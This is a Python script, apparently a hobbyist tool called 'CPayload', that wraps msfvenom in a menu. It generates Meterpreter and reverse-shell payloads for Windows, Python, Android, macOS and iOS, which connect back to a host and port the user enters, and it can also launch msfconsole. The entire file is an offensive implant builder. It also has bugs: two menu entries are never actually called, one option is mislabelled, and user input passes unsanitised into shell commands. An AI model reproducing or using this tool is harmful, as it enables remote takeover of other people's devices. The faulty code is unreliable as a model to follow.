#!/usr/bin/env python3
import os
import time

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print('''\033[32m
  ____ ____             _                 _ 
 / ___|  _ \ __ _ _   _| | ___   __ _  __| |
| |   | |_) / _` | | | | |/ _ \ / _` |/ _` |
| |___|  __/ (_| | |_| | | (_) | (_| | (_| |
 \____|_|   \__,_|\__, |_|\___/ \__,_|\__,_|		-		\033[34m[Made By Theo Kershaw!]\033[32m
                  |___/                     

		\n''')
    print('''\033[32m
[1] Generate Windows Payload.
[2] Generate Python Payload.
[3] Generate Android Payload.
[4] Generate Mac OS Payload.
[5] Generate IOS Payload.
[6] Open MSFconsole.
[99] Exit.
		''')

def windows():
    os.system('cls' if os.name == 'nt' else 'clear')
    print('''\033[32m
[1] Reverse HTTP
[2] Reverse HTTPS
[3] Reverse TCP
		''')
    choice = input('\033[34mEnter Choice: ')
    if choice == '1':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('''\033[32m
[1] X64
[2] X32
[3] Normal
			''')
        choice = input('\033[34mEnter Choice: ')
        if choice == '1':
            os.system('cls' if os.name == 'nt' else 'clear')
            host = input('\033[34mEnter Host IP: ')
            port = input('\033[34mEnter Host Port: ')
            name = input('\033[34mEnter Outfile Directory Or Name: ')
            print('\n\033[32mGenerating Payload...')
            time.sleep(1)
            os.system(f'msfvenom -p windows/x64/meterpreter/reverse_http LHOST={host} LPORT={port} -f exe -o {name} > nul')
            print(f'\033[32mPayload Generated. Output File: {name}')
            input('\n\033[32mPress Enter To Continue...')
        elif choice == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            host = input('\033[34mEnter Host IP: ')
            port = input('\033[34mEnter Host Port: ')
            name = input('\033[34mEnter Outfile Directory Or Name: ')
            print('\n\033[32mGenerating Payload...')
            time.sleep(1)
            os.system(f'msfvenom -p windows/x32/meterpreter/reverse_https LHOST={host} LPORT={port} -f exe -o {name} > nul')
            print(f'\033[32mPayload Generated. Output File: {name}')
            input('\n\033[32mPress Enter To Continue...')
        elif choice == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            host = input('\033[34mEnter Host IP: ')
            port = input('\033[34mEnter Host Port: ')
            name = input('\033[34mEnter Outfile Directory Or Name: ')
            print('\n\033[32mGenerating Payload...')
            time.sleep(1)
            os.system(f'msfvenom -p windows/meterpreter/reverse_http LHOST={host} LPORT={port} -f exe -o {name} > nul')
            print(f'\033[32mPayload Generated. Output File: {name}')
            input('\n\033[32mPress Enter To Continue...')
        else:
            print('\n\033[31mInvalid Option!')
            time.sleep(1)
    elif choice == '2':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('''\033[32m
[1] X64
[2] X32
[3] Normal
			''')
        choice = input('\033[34mEnter Choice: ')
        if choice == '1':
            os.system('cls' if os.name == 'nt' else 'clear')
            host = input('\033[34mEnter Host IP: ')
            port = input('\033[34mEnter Host Port: ')
            name = input('\033[34mEnter Outfile Directory Or Name: ')
            print('\n\033[32mGenerating Payload...')
            time.sleep(1)
            os.system(f'msfvenom -p windows/x64/meterpreter/reverse_https LHOST={host} LPORT={port} -f exe -o {name} > nul')
            print(f'\033[32mPayload Generated. Output File: {name}')
            input('\n\033[32mPress Enter To Continue...')
        elif choice == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            host = input('\033[34mEnter Host IP: ')
            port = input('\033[34mEnter Host Port: ')
            name = input('\033[34mEnter Outfile Directory Or Name: ')
            print('\n\033[32mGenerating Payload...')
            time.sleep(1)
            os.system(f'msfvenom -p windows/x32/meterpreter/reverse_https LHOST={host} LPORT={port} -f exe -o {name} > nul')
            print(f'\033[32mPayload Generated. Output File: {name}')
            input('\n\033[32mPress Enter To Continue...')
        elif choice == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            host = input('\033[34mEnter Host IP: ')
            port = input('\033[34mEnter Host Port: ')
            name = input('\033[34mEnter Outfile Directory Or Name: ')
            print('\n\033[32mGenerating Payload...')
            time.sleep(1)
            os.system(f'msfvenom -p windows/meterpreter/reverse_https LHOST={host} LPORT={port} -f exe -o {name} > nul')
            print(f'\033[32mPayload Generated. Output File: {name}')
            input('\n\033[32mPress Enter To Continue...')
        else:
            print('\n\033[31mInvalid Option!')
            time.sleep(1)
    elif choice == '3':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('''\033[32m
[1] X64
[2] X32
[3] Normal
			''')
        choice = input('\033[34mEnter Choice: ')
        if choice == '1':
            os.system('cls' if os.name == 'nt' else 'clear')
            host = input('\033[34mEnter Host IP: ')
            port = input('\033[34mEnter Host Port: ')
            name = input('\033[34mEnter Outfile Directory Or Name: ')
            print('\n\033[32mGenerating Payload...')
            time.sleep(1)
            os.system(f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -o {name} > nul')
            print(f'\033[32mPayload Generated. Output File: {name}')
            input('\n\033[32mPress Enter To Continue...')
        elif choice == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            host = input('\033[34mEnter Host IP: ')
            port = input('\033[34mEnter Host Port: ')
            name = input('\033[34mEnter Outfile Directory Or Name: ')
            print('\n\033[32mGenerating Payload...')
            time.sleep(1)
            os.system(f'msfvenom -p windows/x32/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -o {name} > nul')
            print(f'\033[32mPayload Generated. Output File: {name}')
            input('\n\033[32mPress Enter To Continue...')
        elif choice == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            host = input('\033[34mEnter Host IP: ')
            port = input('\033[34mEnter Host Port: ')
            name = input('\033[34mEnter Outfile Directory Or Name: ')
            print('\n\033[32mGenerating Payload...')
            time.sleep(1)
            os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -o {name} > nul')
            print(f'\033[32mPayload Generated. Output File: {name}')
            input('\n\033[32mPress Enter To Continue...')
        else:
            print('\n\033[31mInvalid Option!')
            time.sleep(1)

def python():
    os.system('cls' if os.name == 'nt' else 'clear')
    host = input('\033[34mEnter Host IP: ')
    port = input('\033[34mEnter Host Port: ')
    name = input('\033[34mEnter Outfile Directory Or Name: ')
    print('\n\033[32mGenerating Payload...')
    time.sleep(1)
    os.system(f'msfvenom -p python/meterpreter/reverse_https LHOST={host} LPORT={port} -f raw -o {name} > nul')
    print(f'\033[32mPayload Generated. Output File: {name}')
    input('\n\033[32mPress Enter To Continue...')

def android():
    os.system('cls' if os.name == 'nt' else 'clear')
    host = input('\033[34mEnter Host IP: ')
    port = input('\033[34mEnter Host Port: ')
    name = input('\033[34mEnter Outfile Directory Or Name: ')
    print('\n\033[32mGenerating Payload...')
    time.sleep(1)
    os.system(f'msfvenom -p android/meterpreter/reverse_https LHOST={host} LPORT={port} -o {name} > nul')
    print(f'\033[32mPayload Generated. Output File: {name}')
    input('\n\033[32mPress Enter To Continue...')

def mac():
	os.system('cls' if os.name == 'nt' else 'clear')
	print('''\033[32m
[1] Reverse HTTP
[2] Reverse HTTPS
[3] Reverse TCP
		''')
	choice = input('\033[34mEnter Choice: ')
	if choice == '1':
		os.system('cls' if os.name == 'nt' else 'clear')
		host = input('\033[34mEnter Host IP: ')
		port = input('\033[34mEnter Host Port: ')
		name = input('\033[34mEnter Ouputfile Directory Or Name: ')
		print('\n\033[32mGenerating Payload...')
		time.sleep(1)
		os.system(f'msfvenom -p osx/x86/shell_reverse_http LHOST={host} LPORT={port} -f macho > {name}')
		print(f'\033[32mPayload Generated. Output File: {name}')
		input('\n\033[32mPress Enter To Continue...')
	elif choice == '2':
		os.system('cls' if os.name == 'nt' else 'clear')
		host = input('\033[34mEnter Host IP: ')
		port = input('\033[34mEnter Host Port: ')
		name = input('\033[34mEnter Ouputfile Directory Or Name: ')
		print('\n\033[32mGenerating Payload...')
		time.sleep(1)
		os.system(f'msfvenom -p osx/x86/shell_reverse_https LHOST={host} LPORT={port} -f macho > {name}')
		print(f'\033[32mPayload Generated. Output File: {name}')
		input('\n\033[32mPress Enter To Continue...')
	if choice == '3':
		os.system('cls' if os.name == 'nt' else 'clear')
		host = input('\033[34mEnter Host IP: ')
		port = input('\033[34mEnter Host Port: ')
		name = input('\033[34mEnter Ouputfile Directory Or Name: ')
		print('\n\033[32mGenerating Payload...')
		time.sleep(1)
		os.system(f'msfvenom -p osx/x86/shell_reverse_tcp LHOST={host} LPORT={port} -f macho > {name}')
		print(f'\033[32mPayload Generated. Output File: {name}')
		input('\n\033[32mPress Enter To Continue...')
	else:
		print('\n\033[31mInvalid Option!')
		time.sleep(1)

def ios():
	os.system('cls' if os.name == 'nt' else 'clear')
	print('''\033[32m
[1] Reverse HTTP
[2] Reverse HTTPS
[3] Reverse TCP
		''')
	choice = input('\033[34mEnter Choice: ')
	if choice == '1':
		os.system('cls' if os.name == 'nt' else 'clear')
		host = input('\033[34mEnter Host IP: ')
		port = input('\033[34mEnter Host Port: ')
		name = input('\033[34mEnter Ouputfile Directory Or Name: ')
		print('\n\033[32mGenerating Payload...')
		time.sleep(1)
		os.system(f'msfvenom -p osx/armle/shell_reverse_http LHOST={host} LPORT={port} -f macho > {name}')
		print(f'\033[32mPayload Generated. Output File: {name}')
		input('\n\033[32mPress Enter To Continue...')
	elif choice == '2':
		os.system('cls' if os.name == 'nt' else 'clear')
		host = input('\033[34mEnter Host IP: ')
		port = input('\033[34mEnter Host Port: ')
		name = input('\033[34mEnter Ouputfile Directory Or Name: ')
		print('\n\033[32mGenerating Payload...')
		time.sleep(1)
		os.system(f'msfvenom -p osx/armle/shell_reverse_https LHOST={host} LPORT={port} -f macho > {name}')
		print(f'\033[32mPayload Generated. Output File: {name}')
		input('\n\033[32mPress Enter To Continue...')
	if choice == '3':
		os.system('cls' if os.name == 'nt' else 'clear')
		host = input('\033[34mEnter Host IP: ')
		port = input('\033[34mEnter Host Port: ')
		name = input('\033[34mEnter Ouputfile Directory Or Name: ')
		print('\n\033[32mGenerating Payload...')
		time.sleep(1)
		os.system(f'msfvenom -p osx/armle/shell_reverse_tcp LHOST={host} LPORT={port} -f macho > {name}')
		print(f'\033[32mPayload Generated. Output File: {name}')
		input('\n\033[32mPress Enter To Continue...')
	else:
		print('\n\033[31mInvalid Option!')
		time.sleep(1)

def msf():
	os.system('cls' if os.name == 'nt' else 'clear')
	os.system('msfconsole -a')

def main():
	while True:
		banner()

		choice = input('\033[32mEnter Choice: ')

		if choice == '1':
			windows()
		elif choice == '2':
			python()
		elif choice == '3':
			android()
		elif choice == '4':
			mac()
		elif choice == '5':
			ios
		elif choice == '6':
			msf
		elif choice == '99':
			os.system('cls' if os.name == 'nt' else 'clear')
			print('\033[31mGOODBYE...')
			time.sleep(2)
			break
		else:
			print('\033[31mInvalid Option!')
			time.sleep(1)

if __name__ == "__main__":
	main()